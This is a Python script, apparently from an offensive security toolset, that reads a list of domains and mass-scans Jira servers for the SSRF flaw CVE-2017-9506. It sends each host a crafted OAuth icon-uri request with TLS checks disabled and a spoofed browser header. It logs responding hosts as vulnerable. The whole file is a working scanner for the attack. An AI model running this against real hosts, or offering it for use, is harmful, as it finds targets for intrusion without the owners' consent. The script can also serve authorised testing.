#!/usr/bin/env python
#
# jira-scan.py
# Read from a list of domains and check jira for SSRF
# Python 3 this has been tested with.
# CVE-2017-9506
#
# Author: random_robbie

import colorama
import sys
import re
import requests
from time import sleep
from colorama import init, Fore, Back, Style
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
init(autoreset=True)

# Configuration
# filename of the list of urls to test
fname = "list.txt"
FILE = "/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.com"
session = requests.Session()

def filter_result(str):
	str.strip() #trim
	str.lstrip() #ltrim
	str.rstrip() #rtrim
	return str

def test_ssrf (URL,FILE):
	print (Fore.YELLOW +"[*] Testing: "+URL+" [*]")
	try:
		
		URLi = "https://"+URL+""+FILE+""
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
		response = session.get(URLi, headers=headers, timeout=10, verify=False)
		result = response.text
		if 'googlelogo' in result:
			text_file = open("./cfg/vun.txt", "a")
			text_file.write(""+URLi+"\n")
			text_file.close()
			print (Fore.GREEN +"[*] *********** Jira Vulnerable... Found *********** [*]")
			#print (result)
		else:
			print (Fore.RED +"[*] Not Vulnerable [*] ")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (Fore.RED +"[*] Nothing Found on URL:"+URL+" [*]")
		#print (e)
	



	
	
try:
	#READ MASSIVE FILE
	with open(fname) as f:
		for line in f:
			URL = line.replace("\n","")
			test_ssrf (URL,FILE)
		
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
